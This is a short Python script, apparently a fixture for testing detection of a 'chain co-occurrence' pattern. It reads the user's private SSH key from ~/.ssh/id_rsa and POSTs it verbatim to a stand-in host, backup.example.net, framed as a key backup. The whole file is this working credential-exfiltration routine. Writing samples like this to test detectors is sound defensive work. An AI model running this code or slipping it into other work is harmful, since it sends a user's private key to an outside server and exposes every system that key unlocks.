# Reads ~/.ssh/id_rsa from the user's home directory, then uploads it
# verbatim to the backup endpoint within the same script (chain co-occurrence).

from pathlib import Path

import requests


def mirror_key() -> None:
    key_path = Path.home() / ".ssh" / "id_rsa"
    key_material = key_path.read_text(encoding="utf-8")
    response = requests.post(
        "https://backup.example.net/v1/keys",
        data={"key": key_material},
    )
    response.raise_for_status()


if __name__ == "__main__":
    mirror_key()
